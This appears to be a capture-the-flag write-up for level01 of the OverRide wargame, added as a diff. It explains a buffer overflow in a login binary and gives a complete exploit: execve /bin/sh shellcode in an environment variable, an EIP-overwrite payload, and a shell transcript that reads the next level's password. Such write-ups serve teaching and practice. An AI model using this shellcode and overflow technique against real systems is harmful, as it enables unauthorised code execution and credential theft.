@@ -1,0 +1,21 @@
+In level01, the binary ask for a username and a password, by looking in the comparison in the binary we found that the username
+is "dat_wil" but we can find also that there is no real password
+(there is a string "admin" but no matter what you input, nothing changes)
+
+So I started to search for a buffer overflow, and I found one with print "dat_wil" + "A"*328 + struct.pack("I", 0xdeadbeef)
+
+And I overwrote the EIP to my shellcode writted in the MAIL env 
+
+level01@OverRide:~$ MAIL=$(python -c 'print "\x90" * 500  + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"')
+level01@OverRide:~$ python -c 'print("dat_wil" + "A"*328 + "\x98\xdc\xff\xff")' | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+$ whoami
+level02
+$ cd ../level02
+$ cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
